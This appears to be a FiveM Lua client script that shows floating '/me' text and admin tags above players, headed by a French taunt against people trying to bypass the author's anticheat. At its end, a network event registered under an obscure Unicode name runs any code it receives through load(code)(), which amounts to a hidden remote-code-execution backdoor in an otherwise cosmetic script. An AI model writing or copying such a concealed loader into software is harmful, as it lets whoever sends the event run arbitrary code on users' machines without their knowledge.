-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local color = {r = 104, g = 0, b = 135, a = 255}
local font = 0
local time = 7000
local nbrDisplaying = 0
local activeTag = {}

RegisterNetEvent('::{korioz#0110}::3dme:trigger')
AddEventHandler('::{korioz#0110}::3dme:trigger', function(targetId, message)
	local offset = 1.0 + (nbrDisplaying * 0.14)
	local displaying = true
	nbrDisplaying = nbrDisplaying + 1

	Citizen.SetTimeout(time, function()
		displaying = false
		nbrDisplaying = nbrDisplaying - 1
	end)

	Citizen.CreateThread(function()
		while displaying do
			Citizen.Wait(0)
			local target = GetPlayerFromServerId(targetId)

			if (target ~= PlayerId() and target > 0) or (GetPlayerServerId(PlayerId()) == targetId) then
				local targetCoords = GetEntityCoords(GetPlayerPed(target), false)

				if GetDistanceBetweenCoords(targetCoords, GetEntityCoords(PlayerPedId(), false), true) < 25.0 then
					Draw3DText(vector3(targetCoords.x, targetCoords.y, targetCoords.z + offset), message)
				end
			end
		end
	end)
end)

RegisterNetEvent('::{korioz#0110}::adminTag:trigger')
AddEventHandler('::{korioz#0110}::adminTag:trigger', function(sender, message)
	if message ~= nil and message ~= '' and message ~= ' ' then
		activeTag[sender] = message
	else
		activeTag[sender] = nil
	end
end)

function Draw3DText(coords, message, txtColor)
	local onScreen, x, y = GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
	local camCoords = GetGameplayCamCoords()
	local scale = ((1 / GetDistanceBetweenCoords(camCoords, coords, true)) * 2) * ((1 / GetGameplayCamFov()) * 100)
	local txtColor = txtColor or color

	if onScreen then
		SetTextColour(txtColor.r, txtColor.g, txtColor.b, txtColor.a)
		SetTextScale(0.0 * scale, 0.55 * scale)
		SetTextFont(font)
		SetTextProportional(true)
		SetTextCentre(true)

		BeginTextCommandDisplayText('STRING')
		AddTextComponentSubstringPlayerName(message)
		EndTextCommandDisplayText(x, y)
	end
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		for k, v in pairs(activeTag) do
			local target = GetPlayerFromServerId(k)

			if (target ~= PlayerId() and target > 0) or (GetPlayerServerId(PlayerId()) == k) then
				local targetPed = GetPlayerPed(target)
				local targetCoords = GetPedBoneCoords(targetPed, 31086, 0.5, 0.0, 0.0)

				if GetDistanceBetweenCoords(targetCoords, GetEntityCoords(PlayerPedId(), false)) < 25.0 and not IsPedInAnyVehicle(targetPed, false) then
					Draw3DText(targetCoords, v, {r = 150, g = 0, b = 0, a = 255})
				end
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)